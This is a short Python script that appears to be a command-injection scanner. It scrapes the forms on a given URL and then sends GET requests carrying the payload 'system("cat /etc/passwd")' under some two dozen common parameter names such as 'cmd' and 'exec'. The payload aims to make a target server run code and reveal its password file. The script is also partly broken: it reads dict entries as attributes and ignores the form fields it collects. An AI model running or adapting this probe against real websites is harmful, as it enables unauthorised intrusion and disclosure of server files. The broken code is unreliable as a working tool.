import requests
from bs4 import BeautifulSoup
from requests_html import HTMLSession
from pprint import pprint

session = HTMLSession()


payloads = ['cmd', 'exec', 'command', 'execute','ping', 'query', 'jump', 'code',
        'reg', 'do', 'func', 'arg', 'option', 'load', 'process', 'step', 'read',
        'function', 'req', 'feature', 'exe', 'module', 'payload', 'run', 'print']

# returns all form tags found on web page's url
def get_all_forms(url):
    res = session.get(url)
    try:
        res.html.render()
    except Exception as e:
        print(e)
        pass
    soup = BeautifulSoup(res.html.html, "html.parser")
    return soup.find_all("form")

def get_val(name,type,value):
    val_name = name
    val_type = type
    val_value = value
    vals = []
    vals.append({"name": val_name, "type": val_type, "value": val_value})
    return vals

# returns html details of form, controls, inputs, etc...
def get_form_values(form):
    details = {}
    action = form.attrs.get("action").lower()
    method = form.attrs.get("method", "get").lower()
    inputs = []

    for input_tag in form.find_all("input"):
        vals = get_val(name=input_tag.attrs.get("name"),
         type=input_tag.attrs.get("type", "text"), 
         value=input_tag.attrs.get("value", ""))
        
        inputs.append(vals)
    for textarea in form.find_all("textarea"):
        txtarea_vals = get_val(name=textarea.attrs.get("name"), 
                                type="textarea", 
                                value=textarea.attrs.get("value"))
        inputs.append(txtarea_vals)

    print(action, method,inputs)
    details["action"] = action
    details["method"] = method
    details["inputs"] = inputs
    
    return details



if __name__ == "__main__":
    import sys
    url = sys.argv[1]
    forms = get_all_forms(url)
    for i, form in enumerate(forms, start=1):
        form_details = get_form_values(form)
        print("="*50, f"form #{i}", "="*50)
        print(form_details)
        for input_tag in form_details.inputs:
            data = {}
            if input_tag['type'] == 'hidden':
                data[input_tag['name']] = input_tag['value']
            elif input_tag["type"] != "submit":
                for i in range(len(payloads)):
                    search = {payloads[i]:'system("cat /etc/passwd")'}
                    try: 
                        x = requests.get(url, params=search)
                    except Exception as e:
                        print('An error occured!')
                    print(x.status_code)